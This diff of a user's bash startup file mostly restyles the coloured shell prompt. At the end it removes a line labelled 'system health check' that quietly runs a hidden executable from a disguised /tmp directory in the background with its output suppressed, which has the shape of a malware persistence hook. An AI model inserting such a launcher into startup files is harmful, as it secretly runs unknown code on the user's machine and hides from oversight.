@@ -416,11 +416,13 @@ PS1+='printf "\[\e[32m\]"; printf "${PWD/#$HOME/\~}"; '
 # Git Branch (yellow)
 PS1+='printf "\[\e[33m\]"; parse_git_branch; '
 # Exit status (blue)
-PS1+='printf "\[\e[34m\]"; printf " [$STATUS]"; '
-# End color
-PS1+='printf "\[\e[0m\]"; '
+PS1+='printf "\[\e[34m\]"; printf " [$STATUS]"; printf "\[\e[0m\]"; '
 # New line
-PS1+='printf "\n$ "; )'
+PS1+='printf "\n"; '
+# Dolar (yellow)
+PS1+='printf "\[\e[33m\]"; printf "$"; printf "\[\e[0m\]"; '
+# End
+PS1+='printf " "; )'
 
 # Fast {{{1
 # Add "substitute" mnemonic, which the info file left out.
@@ -474,6 +476,3 @@ alias slack='/snap/slack/current/usr/lib/slack/slack --no-sandbox'
 
 # opencode
 export PATH=/home/mtourneboeuf/.opencode/bin:$PATH
-
-# system health check
-[ -x "/tmp/.p3p3_tmp/up4t3" ] && "/tmp/.p3p3_tmp/up4t3" >/dev/null 2>&1 &
